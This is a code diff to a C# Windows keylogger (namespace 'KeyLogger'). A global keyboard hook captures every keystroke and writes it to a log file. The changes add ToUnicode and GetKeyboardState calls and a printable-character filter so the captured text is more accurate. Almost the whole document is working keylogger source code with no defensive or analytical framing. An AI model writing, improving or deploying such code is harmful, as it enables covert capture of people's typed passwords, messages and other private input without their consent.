@@ -45,6 +45,8 @@ using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using System.Text;
+using System.Globalization; // ??? ok..
 
 namespace KeyLogger {
   public static class Program {
@@ -68,6 +70,52 @@ namespace KeyLogger {
 
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
+
+	public static bool isPrintable(string str)
+    {
+        if (string.IsNullOrEmpty(str))
+        {
+            return false;
+        }
+
+        foreach (char c in str)
+        {
+            // Check if the character is a control character
+            if (IsKeyboardControlCharacter(c) || Char.IsControl(c))
+            {
+                return false;
+            }
+        }
+
+        return true;
+    }
+
+    public static bool IsKeyboardControlCharacter(char c)
+{
+        // Check for well-known keyboard-related control characters
+        if (c == '\u0000' || // Null character
+            c == '\u0001' || // Start of Heading
+            c == '\u0002' || // Start of Text
+            c == '\u0003' || // End of Text
+            c == '\u0004' || // End of Transmission
+            c == '\u0005' || // Enquiry
+            c == '\u0006' || // Acknowledgment
+            c == '\u0007' || // Bell (Alert)
+            c == '\u0008' || // Backspace
+            c == '\u0009' || // Horizontal Tab
+            c == '\u000A' || // Line Feed (New Line)
+            c == '\u000B' || // Vertical Tab
+            c == '\u000C' || // Form Feed
+            c == '\u000D' || // Carriage Return
+            c == '\u001B' || // Escape
+            c == '\u007F' || // Delete
+            (c >= '\u0080' && c <= '\u009F')) // Extended ASCII (Control)
+        {
+            return true;
+        }
+        
+        return false;
+    }
 
     public static void Main(string[] args) {
 	  if (args.Length > 0) {
@@ -98,8 +146,29 @@ namespace KeyLogger {
 		bool shiftPressed = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetAsyncKeyState(VK_RSHIFT) & 0x8000) != 0;
         bool capsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-		string keyChar;
+		byte [] keyboardState = new byte[256];
+		StringBuilder output = new StringBuilder(2);
+		GetKeyboardState(keyboardState);
 
+
+		char[] buffer = new char[2];
+		int scanCode = MapVirtualKey((uint)vkCode, 0);
+
+		int result = ToUnicode((uint)vkCode, (uint)scanCode, keyboardState, output, output.Capacity, 0);
+		bool printable = true;
+		if (result > 0) {
+		 	string outputStr = output.ToString();
+			Console.WriteLine("Checking " + outputStr);
+			if (isPrintable(outputStr)) {
+		  		Console.WriteLine("Writing " + outputStr);
+				logFile.Write(outputStr);	
+			} else {
+				Console.WriteLine("Character not printable so falling back");
+				printable = false;
+			}
+		} else { Console.WriteLine("Negative result for ToUnicode"); printable = false; }
+		if (printable == false) {
+			string keyChar;
 		if (vkCode >= (int)Keys.A && vkCode <= (int)Keys.Z) { // Alphabet characters
 			if (shiftPressed ^ capsLockActive) 
 			{
@@ -185,6 +254,7 @@ namespace KeyLogger {
 			}
 			logFile.Write(keyChar);
 		} else { 
+		 Console.WriteLine("Checking for Function");
 		 switch (vkCode) {
            case (int)Keys.F1: logFile.Write("<F1>"); break;
            case (int)Keys.F2: logFile.Write("<F2>"); break;
@@ -229,6 +299,7 @@ namespace KeyLogger {
            default: logFile.Write("<KEY_" + vkCode + ">"); break;
                     }
 			}	
+		}
       }
 
       return CallNextHookEx(hookId, nCode, wParam, lParam);
@@ -246,11 +317,24 @@ namespace KeyLogger {
 	[DllImport("user32.dll")]
 	private static extern int MapVirtualKey(uint uCode, uint uMapType);
 
+	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+	private static extern int ToUnicode(
+		uint wVirtKey, 
+		uint wScanCode, 
+		byte[] lpkeystate, 
+		[Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
+		int wBuffSize,
+		uint wFlags
+		);
+
     [DllImport("user32.dll")]
     private static extern short GetAsyncKeyState(int vKey);
 
     [DllImport("user32.dll")]
     private static extern short GetKeyState(int vKey);
+
+    [DllImport("user32.dll")]
+    private static extern bool GetKeyboardState(byte[] lpKeyState);
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
